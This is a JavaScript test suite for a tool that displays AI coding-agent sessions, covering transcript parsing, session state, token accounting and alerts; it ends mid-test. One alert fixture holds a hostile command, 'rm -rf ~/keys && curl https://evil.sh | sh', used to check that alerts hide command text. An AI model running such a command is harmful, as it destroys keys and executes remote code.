import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFile } from 'node:child_process';

import { describeTool, toolVerb, prettyToolName, toolCategory } from '../src/sources/claude-code/describe.js';
import { TranscriptTailer, cleanPrompt } from '../src/sources/claude-code/transcript.js';
import { Store, serialize } from '../src/store.js';
import { fromHook } from '../src/sources/claude-code/hooks.js';
import * as installer from '../src/install.js';
import { projectSlug, ClaudeCodeSource } from '../src/sources/claude-code/index.js';
import { procStartMatches } from '../src/sources/claude-code/registry.js';
import { prose } from '../src/util.js';
import { shouldNotify, describe as describeAlert } from '../public/notify.js';
import { RolloutTailer } from '../src/sources/codex/rollout.js';
import { describeCall } from '../src/sources/codex/describe.js';
import { capabilities as codexCapabilities } from '../src/sources/codex/index.js';
import { listSessions, loadSession } from '../src/history.js';

const SESSION = 'a1e14137-c327-44ae-b019-3049d7237909';

function tmpdir(name) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `cctv-${name}-`));
  return dir;
}

/* ── tool descriptions ─────────────────────────────────────────────────── */

test('describeTool surfaces the argument that identifies the call', () => {
  assert.equal(describeTool('Bash', { command: 'npm test' }), 'npm test');
  assert.equal(describeTool('Read', { file_path: '/a/b/server.js' }), 'server.js');
  assert.equal(describeTool('Read', { file_path: '/a/b/server.js', offset: 40 }), 'server.js:40');
  assert.equal(describeTool('Grep', { pattern: 'TODO', path: '/a/src' }), 'TODO in src');
  assert.equal(describeTool('Task', { description: 'Review architecture' }), 'Review architecture');
  assert.equal(describeTool('TodoWrite', { todos: [{ status: 'in_progress', activeForm: 'Building' }] }), 'Building');
});

test('describeTool falls back to the first string argument for unknown tools', () => {
  assert.equal(describeTool('mcp__x__y', { channel: 'general', limit: 5 }), 'general');
  assert.equal(describeTool('Whatever', {}), '');
  assert.equal(describeTool('Whatever', null), '');
});

test('mcp tool names collapse to server: function', () => {
  assert.equal(prettyToolName('mcp__plugin_vercel_vercel__authenticate'), 'vercel: authenticate');
  assert.equal(prettyToolName('Bash'), 'Bash');
  assert.equal(toolVerb('mcp__a__b'), 'Calling');
  assert.equal(toolCategory('Edit'), 'write');
  assert.equal(toolCategory('mcp__a__b'), 'net');
});

/* ── prompt cleaning ───────────────────────────────────────────────────── */

test('slash commands render as the command, not their XML envelope', () => {
  const raw = '<command-name>/clear</command-name>\n<command-message>clear</command-message>\n<command-args></command-args>';
  assert.equal(cleanPrompt(raw), '/clear');
  assert.equal(
    cleanPrompt('<command-name>/loop</command-name><command-args>5m /foo</command-args>'),
    '/loop 5m /foo'
  );
});

test('command output and system reminders never look like prompts', () => {
  assert.equal(cleanPrompt('<local-command-stdout>hi</local-command-stdout>'), '');
  assert.equal(cleanPrompt('<system-reminder>be good</system-reminder>'), '');
  assert.equal(cleanPrompt('real prompt <system-reminder>noise</system-reminder>'), 'real prompt');
  assert.equal(cleanPrompt(''), '');
});

test('markdown is stripped before newlines are collapsed', () => {
  const raw = 'Pushed `main` at 3804af3.\n\n## The GPU pod\n\n- **not possible** on this account\n> a quote\n[docs](https://x.com)';
  const out = prose(raw, 300);
  assert.ok(!/[#*`>[\]]/.test(out), `markers survived: ${out}`);
  assert.match(out, /The GPU pod/);
  assert.match(out, /· not possible on this account/);
  assert.match(out, /docs$/);
});

test('fenced code becomes a marker rather than a wall of text', () => {
  assert.equal(prose('before\n```js\nlots of code\n```\nafter'), 'before ⟨code⟩ after');
});

/* ── transcript -> events ──────────────────────────────────────────────── */

function writeTranscript(lines) {
  const root = tmpdir('projects');
  const dir = path.join(root, '-tmp-proj');
  fs.mkdirSync(dir);
  const file = path.join(dir, `${SESSION}.jsonl`);
  fs.writeFileSync(file, lines.map((l) => JSON.stringify(l)).join('\n') + '\n');
  return { root, file };
}

function collect(root) {
  const tailer = new TranscriptTailer({ root });
  const batches = [];
  tailer.on('batch', (b) => batches.push(b));
  tailer.scan(true);
  tailer.stop();
  return batches.flatMap((b) => b.events);
}

test('a tool_use with no result yet is a running tool; a result closes it', () => {
  const { root } = writeTranscript([
    { type: 'user', sessionId: SESSION, uuid: 'u1', timestamp: '2026-08-05T10:00:00Z', message: { role: 'user', content: 'do it' } },
    {
      type: 'assistant',
      sessionId: SESSION,
      uuid: 'a1',
      timestamp: '2026-08-05T10:00:01Z',
      message: { role: 'assistant', model: 'claude-opus-5', content: [{ type: 'tool_use', id: 't1', name: 'Bash', input: { command: 'ls' } }] },
    },
    {
      type: 'user',
      sessionId: SESSION,
      uuid: 'u2',
      timestamp: '2026-08-05T10:00:03Z',
      message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', is_error: false }] },
    },
  ]);

  const events = collect(root);
  const kinds = events.map((e) => e.kind);
  assert.deepEqual(kinds, ['prompt', 'tool_start', 'tool_end']);

  const start = events[1];
  assert.equal(start.tool.name, 'Bash');
  assert.equal(start.detail, 'ls');

  const end = events[2];
  assert.equal(end.tool.ok, true);
  assert.equal(end.tool.durationMs, 2000, 'duration comes from the matching tool_use');
  assert.equal(end.detail, 'ls', 'the result inherits the call it belongs to');
});

test('failed tool results are marked and carry the error text', () => {
  const { root } = writeTranscript([
    {
      type: 'assistant',
      sessionId: SESSION,
      uuid: 'a1',
      timestamp: '2026-08-05T10:00:01Z',
      message: { content: [{ type: 'tool_use', id: 't1', name: 'Read', input: { file_path: '/nope.txt' } }] },
    },
    {
      type: 'user',
      sessionId: SESSION,
      uuid: 'u1',
      timestamp: '2026-08-05T10:00:02Z',
      message: { content: [{ type: 'tool_result', tool_use_id: 't1', is_error: true, content: 'ENOENT: no such file' }] },
    },
  ]);
  const end = collect(root).find((e) => e.kind === 'tool_end');
  assert.equal(end.tool.ok, false);
  assert.match(end.detail, /ENOENT/);
});

test('subagent work is tagged so it cannot be mistaken for the main lane', () => {
  const { root } = writeTranscript([
    {
      type: 'assistant',
      sessionId: SESSION,
      uuid: 'a1',
      isSidechain: true,
      timestamp: '2026-08-05T10:00:01Z',
      message: { content: [{ type: 'tool_use', id: 't1', name: 'Grep', input: { pattern: 'x' } }] },
    },
  ]);
  assert.equal(collect(root)[0].lane, 'sub');
});

test('turn_duration and queued prompts become events', () => {
  const { root } = writeTranscript([
    { type: 'system', subtype: 'turn_duration', sessionId: SESSION, uuid: 's1', durationMs: 16595, timestamp: '2026-08-05T10:00:05Z' },
    { type: 'queue-operation', operation: 'enqueue', sessionId: SESSION, content: 'next thing', timestamp: '2026-08-05T10:00:06Z' },
  ]);
  const events = collect(root);
  assert.deepEqual(events.map((e) => e.kind), ['turn_end', 'queued']);
  assert.equal(events[0].detail, '17s');
  assert.equal(events[1].detail, 'next thing');
});

test('the same entry is never emitted twice', () => {
  const { root, file } = writeTranscript([
    { type: 'assistant', sessionId: SESSION, uuid: 'a1', timestamp: '2026-08-05T10:00:01Z', message: { content: [{ type: 'text', text: 'hello' }] } },
  ]);
  const tailer = new TranscriptTailer({ root });
  const events = [];
  tailer.on('batch', (b) => events.push(...b.events));
  tailer.scan(true);
  tailer.read(file); // a second read of unchanged bytes
  tailer.stop();
  assert.equal(events.length, 1);
});

/* ── store: who owns state ─────────────────────────────────────────────── */

test('the registry outranks hooks and inference', () => {
  const store = new Store();
  store.capabilities = { registry: true };
  const T = 1785916884840;

  store.apply({ sessionId: 's', patch: { state: 'busy', statusUpdatedAt: T, authoritative: true } });
  assert.equal(store.get('s').state, 'busy');
  assert.equal(store.get('s').stateSince, T, 'the transition time comes from the registry');

  // A hook claiming otherwise must not win.
  store.apply({ sessionId: 's', patch: { state: 'waiting', waitingFor: 'permission prompt' } });
  assert.equal(store.get('s').state, 'busy');
  assert.equal(store.get('s').stateSince, T);
});

test('without a registry the store infers state from activity', () => {
  const store = new Store();
  store.capabilities = { registry: false };
  store.apply({
    sessionId: 's',
    patch: {},
    events: [{ id: 'e1', ts: Date.now(), kind: 'tool_start', lane: 'main', tool: { id: 't1', name: 'Bash', pretty: 'Bash', category: 'exec' }, detail: 'ls' }],
  });
  assert.equal(store.get('s').state, 'busy');
  assert.equal(store.get('s').currentTool.name, 'Bash');
});

test('parallel tool calls keep the banner until the last one returns', () => {
  const store = new Store();
  const ev = (id, kind, toolId, name) => ({
    id,
    ts: Date.now(),
    kind,
    lane: 'main',
    detail: name,
    tool: { id: toolId, name, pretty: name, category: 'exec', ok: true },
  });
  store.apply({
    sessionId: 's',
    patch: { authoritative: true, state: 'busy' },
    events: [ev('1', 'tool_start', 'a', 'Bash'), ev('2', 'tool_start', 'b', 'Read')],
  });
  assert.equal(store.get('s').currentTool.name, 'Read');

  store.apply({ sessionId: 's', patch: {}, events: [ev('3', 'tool_end', 'b', 'Read')] });
  assert.equal(store.get('s').currentTool.name, 'Bash', 'Bash is still running');

  store.apply({ sessionId: 's', patch: {}, events: [ev('4', 'tool_end', 'a', 'Bash')] });
  assert.equal(store.get('s').currentTool, null);
});

test('a waiting session that needs a decision sorts above one that just finished', () => {
  const store = new Store();
  store.capabilities = { registry: true };
  store.apply({ sessionId: 'done', patch: { authoritative: true, state: 'waiting', waitingFor: 'input needed' } });
  store.apply({ sessionId: 'blocked', patch: { authoritative: true, state: 'waiting', waitingFor: 'permission prompt' } });
  store.apply({ sessionId: 'working', patch: { authoritative: true, state: 'busy' } });

  assert.deepEqual(store.list().map((s) => s.id), ['blocked', 'working', 'done']);
  assert.equal(store.snapshot().sessions[0].urgent, true);
});

test('with no registry, hook states beat inference', () => {
  const store = new Store();
  store.capabilities = { registry: false };
  const hook = (name, extra) =>
    fromHook({ source: 'claude-code', receivedAt: Date.now(), payload: { session_id: 's1', hook_event_name: name, cwd: '/tmp/p', ...extra } });

  store.apply(hook('UserPromptSubmit', { prompt: 'go' }));
  store.apply(hook('PreToolUse', { tool_name: 'Bash', tool_input: { command: 'make' } }));
  assert.equal(store.get('s1').state, 'busy');
  assert.equal(store.get('s1').currentTool.detail, 'make');

  store.apply(hook('Stop', {}));
  assert.equal(store.get('s1').state, 'idle', 'the Stop hook wins over "recently active, so busy"');
});

test('a hooks-only session that goes silent stops looking live', () => {
  const store = new Store();
  store.capabilities = { registry: false };
  store.apply(
    fromHook({ source: 'claude-code', receivedAt: Date.now(), payload: { session_id: 's1', hook_event_name: 'Stop', cwd: '/tmp/p' } })
  );
  const s = store.get('s1');
  assert.equal(s.state, 'idle');
  s.lastActivityAt = Date.now() - 45 * 60e3;
  store.sweep();
  assert.equal(store.get('s1').state, 'ended');
  assert.equal(store.get('s1').endedReason, 'silent');
});

test('a registry file vanishing retires the session, urgency included', () => {
  // The gone patch must carry authority: the session became authoritative on
  // `appeared`, and the store refuses a state write from anyone weaker. Losing
  // that flag left an exited CLI's tile — urgent border and all — up forever.
  const sessionsDir = tmpdir('sessions');
  const src = new ClaudeCodeSource({ projectsRoot: tmpdir('projects'), sessionsDir });
  src.caps = { ...src.caps, registry: true, tasks: false };
  const store = new Store();
  src.on('update', (u) => store.apply(u));
  src.start();

  const file = path.join(sessionsDir, `${process.pid}.json`);
  fs.writeFileSync(file, JSON.stringify({ sessionId: 'gone-1', cwd: '/tmp/p', status: 'waiting', waitingFor: 'permission to run rm' }));
  src.registry.poll();
  assert.equal(store.get('gone-1').state, 'waiting');
  assert.equal(serialize(store.get('gone-1')).urgent, true);

  fs.rmSync(file);
  src.registry.poll();
  src.stop();
  assert.equal(store.get('gone-1').state, 'ended');
  assert.equal(store.get('gone-1').endedReason, 'file-removed');
  assert.equal(serialize(store.get('gone-1')).urgent, false);
});

test('a procStart recorded in UTC is not condemned as pid reuse', async () => {
  // Claude Code writes procStart in UTC; ps renders lstart in the local
  // timezone. On any machine not at UTC, exact string equality declared every
  // live session pid-reused and the whole wall went NO SIGNAL seconds after
  // start. Same trick as the bug: record our own pid's start the way Claude
  // Code would, and check the verifier still believes in us.
  const utcStart = await new Promise((resolve) => {
    execFile(
      'ps',
      ['-p', String(process.pid), '-o', 'lstart='],
      { env: { ...process.env, TZ: 'UTC' }, timeout: 2000 },
      (err, out) => resolve(err ? null : out.trim())
    );
  });
  assert.ok(utcStart, 'ps must render our own start time');

  const sessionsDir = tmpdir('sessions');
  const src = new ClaudeCodeSource({ projectsRoot: tmpdir('projects'), sessionsDir });
  src.caps = { ...src.caps, registry: true, tasks: false };
  const store = new Store();
  src.on('update', (u) => store.apply(u));
  src.start();

  fs.writeFileSync(
    path.join(sessionsDir, `${process.pid}.json`),
    JSON.stringify({ sessionId: 'tz-1', cwd: '/tmp/p', status: 'busy', procStart: utcStart })
  );
  src.registry.poll();
  for (let i = 0; i < 100 && src.registry.verifiedPids.get(process.pid) === 'pending'; i++) {
    await new Promise((r) => setTimeout(r, 20));
  }
  src.stop();

  assert.equal(src.registry.verifiedPids.get(process.pid), true, 'the binding is verified');
  assert.equal(store.get('tz-1').state, 'busy', 'the session keeps its real state');
});

test('procStartMatches accepts either timezone rendering and nothing less', () => {
  const starts = { local: 'Sat Aug  8 13:13:39 2026', utc: 'Sat Aug  8 09:43:39 2026' };
  assert.equal(procStartMatches('Sat Aug  8 09:43:39 2026', starts), true, 'UTC-recorded');
  assert.equal(procStartMatches('Sat Aug  8 13:13:39 2026', starts), true, 'local-recorded');
  assert.equal(procStartMatches('Wed Aug  5 07:02:33 2026', starts), false, 'different process');
  assert.equal(procStartMatches(null, starts), true, 'nothing recorded, nothing to disprove');
  assert.equal(procStartMatches('Sat Aug  8 09:43:39 2026', { local: null, utc: null }), true, 'ps failing is not proof of reuse');
});

test('a genuinely reused pid is still caught', async () => {
  const sessionsDir = tmpdir('sessions');
  const src = new ClaudeCodeSource({ projectsRoot: tmpdir('projects'), sessionsDir });
  src.caps = { ...src.caps, registry: true, tasks: false };
  const store = new Store();
  src.on('update', (u) => store.apply(u));
  src.start();

  fs.writeFileSync(
    path.join(sessionsDir, `${process.pid}.json`),
    JSON.stringify({ sessionId: 'reuse-1', cwd: '/tmp/p', status: 'busy', procStart: 'Wed Jan  1 00:00:00 2020' })
  );
  src.registry.poll();
  for (let i = 0; i < 100 && src.registry.verifiedPids.get(process.pid) === 'pending'; i++) {
    await new Promise((r) => setTimeout(r, 20));
  }
  src.stop();

  assert.equal(store.get('reuse-1').state, 'ended');
  assert.equal(store.get('reuse-1').endedReason, 'pid-reused');
});

test('a shell status shows as working, not unknown', () => {
  // status: "shell" is Claude Code running the user's `!` command — activity,
  // and newer than mapState's vocabulary was.
  const sessionsDir = tmpdir('sessions');
  const src = new ClaudeCodeSource({ projectsRoot: tmpdir('projects'), sessionsDir });
  src.caps = { ...src.caps, registry: true, tasks: false };
  const store = new Store();
  src.on('update', (u) => store.apply(u));
  src.start();

  fs.writeFileSync(
    path.join(sessionsDir, `${process.pid}.json`),
    JSON.stringify({ sessionId: 'sh-1', cwd: '/tmp/p', status: 'shell' })
  );
  src.registry.poll();
  src.stop();

  assert.equal(store.get('sh-1').state, 'busy');
});

test('ended sessions leave the wall once they are stale', () => {
  const store = new Store();
  store.capabilities = { registry: true };
  store.apply({ sessionId: 'x', patch: { authoritative: true, state: 'ended' } });
  const s = store.get('x');
  s.lastActivityAt = Date.now() - 60 * 60e3;
  s.stateSince = s.lastActivityAt;
  store.sweep();
  assert.equal(store.get('x'), null);
});

/* ── history ───────────────────────────────────────────────────────────── */

test('history lists finished sessions and leaves the live ones to the wall', () => {
  const { root } = writeTranscript([
    { type: 'user', sessionId: SESSION, uuid: 'u1', timestamp: '2026-08-05T10:00:00Z', cwd: '/tmp/myproj', message: { role: 'user', content: 'do the thing' } },
  ]);
  const roots = [{ source: 'claude-code', root }];

  const all = listSessions({ roots, dbs: [] });
  assert.equal(all.sessions.length, 1);
  assert.equal(all.sessions[0].id, SESSION);
  assert.equal(all.sessions[0].project, 'myproj', 'the project is read without parsing the whole file');
  assert.equal(all.sessions[0].title, 'do the thing', 'failing an ai-title, the first prompt identifies it');

  // A session already on the wall is not also in the archive.
  const filtered = listSessions({ roots, dbs: [], live: new Set([SESSION]) });
  assert.equal(filtered.sessions.length, 0);
  assert.equal(filtered.total, 0);
});

test('history honours the window it was asked for', () => {
  const { root, file } = writeTranscript([
    { type: 'user', sessionId: SESSION, uuid: 'u1', timestamp: '2026-08-05T10:00:00Z', message: { role: 'user', content: 'old work' } },
  ]);
  const roots = [{ source: 'claude-code', root }];
  const old = Date.now() - 30 * 24 * 60 * 60e3;
  fs.utimesSync(file, new Date(old), new Date(old));

  assert.equal(listSessions({ roots, dbs: [], sinceMs: 7 * 24 * 60 * 60e3 }).sessions.length, 0, 'outside a week');
  assert.equal(listSessions({ roots, dbs: [], sinceMs: 60 * 24 * 60 * 60e3 }).sessions.length, 1, 'inside two months');
});

test('a past session reads back through the same normalization it had when live', () => {
  const { root } = writeTranscript([
    { type: 'user', sessionId: SESSION, uuid: 'u1', timestamp: '2026-08-05T10:00:00Z', cwd: '/tmp/myproj', message: { role: 'user', content: 'ship it' } },
    {
      type: 'assistant',
      sessionId: SESSION,
      uuid: 'a1',
      timestamp: '2026-08-05T10:00:01Z',
      cwd: '/tmp/myproj',
      message: { role: 'assistant', model: 'claude-opus-5', content: [{ type: 'tool_use', id: 't1', name: 'Bash', input: { command: 'npm test' } }], usage: { input_tokens: 4, cache_read_input_tokens: 40_000, output_tokens: 12 } },
    },
    { type: 'user', sessionId: SESSION, uuid: 'u2', timestamp: '2026-08-05T10:00:03Z', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', is_error: false }] } },
  ]);

  const detail = loadSession(SESSION, { roots: [{ source: 'claude-code', root }], dbs: [] });
  assert.equal(detail.id, SESSION);
  assert.equal(detail.historical, true);
  assert.equal(detail.state, 'ended', 'a session read from the archive is stated as over, not guessed at');
  assert.equal(detail.project, 'myproj');
  assert.equal(detail.model, 'claude-opus-5');
  assert.deepEqual(detail.events.map((e) => e.kind), ['prompt', 'tool_start', 'tool_end']);
  assert.equal(detail.events[1].detail, 'npm test');
  assert.equal(detail.usage.context, 40_004, 'the same token arithmetic as a live tile');
  assert.equal(loadSession('nope-not-a-session', { roots: [{ source: 'claude-code', root }], dbs: [] }), null);
});

/* ── token accounting ──────────────────────────────────────────────────── */

function assistantWithUsage(uuid, usage, extra = {}) {
  return {
    type: 'assistant',
    sessionId: SESSION,
    uuid,
    timestamp: '2026-08-05T10:00:00Z',
    message: { role: 'assistant', model: 'claude-opus-5', content: [{ type: 'text', text: 'ok' }], usage },
    ...extra,
  };
}

function lastMeta(root) {
  const tailer = new TranscriptTailer({ root });
  const batches = [];
  tailer.on('batch', (b) => batches.push(b));
  tailer.scan(true);
  tailer.stop();
  return batches[batches.length - 1].meta;
}

test('context is read from the newest request, never summed across them', () => {
  // Every request resends the conversation, so input+cache_read on the last
  // message IS the context. Summing would report tens of millions.
  const { root } = writeTranscript([
    assistantWithUsage('a1', { input_tokens: 3, cache_read_input_tokens: 100_000, cache_creation_input_tokens: 500, output_tokens: 200 }),
    assistantWithUsage('a2', { input_tokens: 2, cache_read_input_tokens: 150_000, cache_creation_input_tokens: 800, output_tokens: 300 }),
  ]);
  const { usage } = lastMeta(root);
  assert.equal(usage.context, 150_802, 'the latest request, all three input buckets added');
  assert.equal(usage.output, 500, 'output is genuinely incremental, so it does sum');
  assert.equal(usage.contextWindow, null, 'claude does not record a window, so no fake percentage');
  assert.equal(usage.input, 5, 'billed input IS summed — every request pays its uncached tokens');
  assert.equal(usage.cacheRead, 250_000);
  assert.equal(usage.cacheWrite, 1_300);
  assert.equal(usage.cost, null, 'claude code writes no dollar figure, so neither do we');
});

test('a subagent request counts toward the sums but never the context', () => {
  const { root } = writeTranscript([
    assistantWithUsage('a1', { input_tokens: 2, cache_read_input_tokens: 190_000, output_tokens: 100 }),
    // A sidechain carries its own fresh context; letting it land would make the
    // session look like it had suddenly emptied out. Its tokens are still this
    // session's work, though — a total that dropped them would understate
    // every session that delegated anything.
    assistantWithUsage('a2', { input_tokens: 1, cache_read_input_tokens: 4_000, output_tokens: 50 }, { isSidechain: true }),
  ]);
  const { usage } = lastMeta(root);
  assert.equal(usage.context, 190_002);
  assert.equal(usage.output, 150, "the subagent's output is still this session's spend");
  assert.equal(usage.input, 3, 'sidechain input counts toward the billed sums');
  assert.equal(usage.cacheRead, 194_000);
});

test('a total that had to be summed says so when the log was joined mid-way', () => {
  const { root } = writeTranscript([assistantWithUsage('a1', { input_tokens: 5, output_tokens: 42 })]);
  assert.equal(lastMeta(root).usage.outputPartial, false, 'a short transcript is read from the start');

  const big = writeTranscript([
    { type: 'assistant', sessionId: SESSION, uuid: 'pad', timestamp: '2026-08-05T09:00:00Z', message: { content: [{ type: 'text', text: 'x'.repeat(120 * 1024) }] } },
    assistantWithUsage('a2', { input_tokens: 7, output_tokens: 99 }),
  ]);
  assert.equal(lastMeta(big.root).usage.outputPartial, true, 'past the bootstrap window, the sum is admittedly partial');
});

test('codex context comes from its own convention, not claude arithmetic', () => {
  // Codex's input_tokens already includes the cached part, and it keeps its own
  // running total — so nothing here is summed on our side.
  const root = writeRollout([
    {
      timestamp: '2026-08-05T10:00:00Z',
      type: 'event_msg',
      payload: {
        type: 'token_count',
        info: {
          total_token_usage: { input_tokens: 1_237_468, cached_input_tokens: 1_165_568, output_tokens: 6_947, total_tokens: 1_244_415 },
          last_token_usage: { input_tokens: 19_633, cached_input_tokens: 11_008, output_tokens: 131 },
          model_context_window: 258_400,
        },
      },
    },
  ]);
  const { usage } = collectRollout(root)[0].meta;
  assert.equal(usage.context, 19_633, 'the last request only, cached portion already inside it');
  assert.equal(usage.contextWindow, 258_400, 'codex does record a window, so a percentage is honest');
  assert.equal(usage.output, 6_947, "the running total codex keeps, not our sum");
  assert.equal(usage.outputPartial, false);
  assert.equal(usage.input, 71_900, 'uncached input is a subtraction — codex folds the cached part in');
  assert.equal(usage.cacheRead, 1_165_568);
  assert.equal(usage.cacheWrite, null, 'codex records no cache-write number, so neither do we');
  assert.equal(usage.cost, null);
});

/* ── codex rollouts ────────────────────────────────────────────────────── */

const CODEX_SESSION = '019fc8a0-37db-7163-b4b6-650a93911216';

function writeRollout(lines, name = `rollout-2026-08-05T10-00-00-${CODEX_SESSION}`) {
  const root = tmpdir('codex');
  const dir = path.join(root, '2026', '08', '05');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, `${name}.jsonl`), lines.map((l) => JSON.stringify(l)).join('\n') + '\n');
  return root;
}

function collectRollout(root) {
  const tailer = new RolloutTailer({ root, freshWindowMs: 60 * 60e3 });
  const batches = [];
  tailer.on('batch', (b) => batches.push(b));
  tailer.scan(true);
  tailer.stop();
  return batches;
}

test('a rollout is found three directories deep and named by its uuid', () => {
  const root = writeRollout([
    { timestamp: '2026-08-05T10:00:00Z', type: 'event_msg', payload: { type: 'user_message', message: 'ship it' } },
  ]);
  const [batch] = collectRollout(root);
  assert.equal(batch.sessionId, CODEX_SESSION, 'the uuid comes out of the filename, not the payload');
  assert.equal(batch.events[0].kind, 'prompt');
  assert.equal(batch.events[0].source, 'codex');
});

test('a file that is not a rollout is ignored entirely', () => {
  const root = writeRollout(
    [{ timestamp: '2026-08-05T10:00:00Z', type: 'event_msg', payload: { type: 'user_message', message: 'hi' } }],
    'notes'
  );
  assert.deepEqual(collectRollout(root), []);
});

test('codex calls pair into tool_start and tool_end with a duration', () => {
  const root = writeRollout([
    {
      timestamp: '2026-08-05T10:00:01Z',
      type: 'response_item',
      payload: { type: 'custom_tool_call', call_id: 'c1', name: 'exec', input: 'const r = await tools.exec_command({"cmd":"npm test"});' },
    },
    {
      timestamp: '2026-08-05T10:00:04Z',
      type: 'response_item',
      payload: { type: 'custom_tool_call_output', call_id: 'c1', output: [{ type: 'input_text', text: 'ok' }] },
    },
  ]);
  const events = collectRollout(root)[0].events;
  assert.deepEqual(events.map((e) => e.kind), ['tool_start', 'tool_end']);
  assert.equal(events[0].detail, 'npm test', 'the shell command is dug out of the JS wrapper');
  assert.equal(events[0].tool.category, 'exec');
  assert.equal(events[1].tool.ok, true);
  assert.equal(events[1].tool.durationMs, 3000);
  assert.equal(events[1].detail, 'npm test', 'the result inherits the call it belongs to');
});

test('a non-zero exit marks a codex call failed; ordinary prose does not', () => {
  const fail = (text) =>
    collectRollout(
      writeRollout([
        { timestamp: '2026-08-05T10:00:01Z', type: 'response_item', payload: { type: 'function_call', call_id: 'c1', name: 'exec_command', arguments: '{"cmd":"npm test"}' } },
        { timestamp: '2026-08-05T10:00:02Z', type: 'response_item', payload: { type: 'function_call_output', call_id: 'c1', output: [{ type: 'input_text', text }] } },
      ])
    )[0].events.find((e) => e.kind === 'tool_end').tool.ok;

  assert.equal(fail('Command exited with exit code 1'), false);
  assert.equal(fail('All good. No error found in the logs.'), true, 'the word "error" in output is not a failure');
});

test('codex turn boundaries become state, never a new event kind', () => {
  const root = writeRollout([
    { timestamp: '2026-08-05T10:00:00Z', type: 'event_msg', payload: { type: 'task_started', turn_id: 't1' } },
    { timestamp: '2026-08-05T10:00:09Z', type: 'event_msg', payload: { type: 'agent_message', message: 'Working on it' } },
  ]);
  const batch = collectRollout(root)[0];
  assert.equal(batch.meta.state, 'busy');
  assert.deepEqual(batch.events.map((e) => e.kind), ['assistant_text'], 'task_started is not an event');

  const done = collectRollout(
    writeRollout([
      { timestamp: '2026-08-05T10:00:00Z', type: 'event_msg', payload: { type: 'task_started' } },
      { timestamp: '2026-08-05T10:00:16Z', type: 'event_msg', payload: { type: 'task_complete', duration_ms: 16000 } },
    ])
  )[0];
  assert.equal(done.meta.state, 'idle', 'the last boundary in the batch wins');
  assert.deepEqual(done.events.map((e) => e.kind), ['turn_end']);
  assert.equal(done.events[0].detail, '16s');
});

test('codex session facts are collected without copying the transcript', () => {
  const root = writeRollout([
    {
      timestamp: '2026-08-05T10:00:00Z',
      type: 'session_meta',
      payload: { session_id: CODEX_SESSION, cwd: '/tmp/proj', cli_version: '0.146.0', originator: 'Codex Desktop' },
    },
    {
      timestamp: '2026-08-05T10:00:01Z',
      type: 'turn_context',
      payload: { cwd: '/tmp/proj', model: 'gpt-5.6-terra', approval_policy: 'on-request' },
    },
    {
      timestamp: '2026-08-05T10:00:02Z',
      type: 'event_msg',
      payload: { type: 'token_count', info: { total_token_usage: { input_tokens: 100, output_tokens: 20, total_tokens: 120 }, model_context_window: 258400 } },
    },
  ]);
  const { meta } = collectRollout(root)[0];
  assert.equal(meta.cwd, '/tmp/proj');
  assert.equal(meta.model, 'gpt-5.6-terra');
  assert.equal(meta.version, '0.146.0');
  assert.equal(meta.entrypoint, 'Codex Desktop');
  assert.equal(meta.permissionMode, 'on-request', 'the approval policy is a mode, not a state');
  assert.equal(meta.usage.output, 20);
  assert.equal(meta.usage.context, null, 'no last_token_usage yet means no context number, not a wrong one');
});

test('codex tool arguments collapse to the one line that identifies the call', () => {
  assert.equal(describeCall('exec_command', '{"cmd":"rg -n TODO .","workdir":"/x"}'), 'rg -n TODO .');
  assert.equal(describeCall('apply_patch', '*** Begin Patch\n*** Update File: /a/b/nav.tsx\n@@\n-x\n+y\n'), 'nav.tsx');
  assert.equal(
    describeCall('exec', 'const patch = "*** Begin Patch\\n*** Add File: lib/abort.ts\\n+export const x = 1;";'),
    'patch abort.ts',
    'an escaped patch inside a JS string does not spill its body onto the tile'
  );
  assert.equal(describeCall('exec', 'const r = await tools.mcp__node_repl__js({"title":"Open the page"});'), 'node_repl: js — Open the page');
  assert.equal(describeCall('wait', '{"cell_id":"2"}'), 'cell 2');
  assert.equal(describeCall('load_workspace_dependencies', '{}'), '');
  assert.equal(describeCall('exec', null), '');
});

test('a codex session keeps its state even while the claude registry is working', () => {
  const store = new Store();
  // Claude has authority over its own sessions; codex has none over anything.
  store.capabilities = { 'claude-code': { authoritative: true }, codex: { authoritative: false } };

  // Explicit, from task_started — not authoritative, but not a guess either.
  store.apply({ sessionId: 'cx', patch: { source: 'codex', state: 'busy' } });
  assert.equal(store.get('cx').state, 'busy');

  // A codex batch with no turn boundary in it must still land somewhere real,
  // rather than sitting at 'unknown' because *Claude's* registry happens to work.
  store.apply({
    sessionId: 'cx2',
    patch: { source: 'codex' },
    events: [{ id: 'e1', ts: Date.now(), kind: 'tool_start', lane: 'main', tool: { id: 't1', name: 'exec', pretty: 'exec', category: 'exec' }, detail: 'npm test' }],
  });
  assert.equal(store.get('cx2').state, 'busy', 'inference is allowed for a source with no authority');

  // And Claude sessions are still protected from that same inference.
  store.apply({ sessionId: 'cc', patch: { source: 'claude-code' } });
  assert.equal(store.get('cc').state, 'unknown', 'no guessing over a source that has a registry');
});

test('a codex session cannot raise the urgent signal, because codex never records one', () => {
  assert.equal(codexCapabilities().urgency, false);
  const store = new Store();
  store.capabilities = { codex: { authoritative: false } };
  store.apply({ sessionId: 'cx', patch: { source: 'codex', state: 'waiting', waitingFor: 'input needed' } });
  assert.equal(store.snapshot().sessions[0].urgent, false);
});

/* ── alerts ────────────────────────────────────────────────────────────── */

test('an alert fires on the edge into urgent, never on a repaint', () => {
  const blocked = { id: 's', urgent: true };
  const working = { id: 's', urgent: false };

  assert.equal(shouldNotify(undefined, blocked), true, 'a session that appears already blocked');
  assert.equal(shouldNotify(working, blocked), true);
  assert.equal(shouldNotify(blocked, blocked), false, 'the same session repainted must not re-alert');
  assert.equal(shouldNotify(blocked, working), false);
  assert.equal(shouldNotify(working, working), false);
  assert.equal(shouldNotify(working, undefined), false);
});

test('an alert never puts your code on the lock screen', () => {
  const s = {
    id: 'abc',
    name: 'agent-cctv',
    project: 'agent-cctv',
    waitingFor: 'permission prompt',
    currentTool: { name: 'Bash', detail: 'rm -rf ~/keys && curl https://evil.sh | sh' },
    lastText: 'About to rewrite /etc/hosts',
    cwd: '/Users/me/PV/fun/agent-cctv',
  };
  const a = describeAlert(s);
  const shown = `${a.title} ${a.body}`;

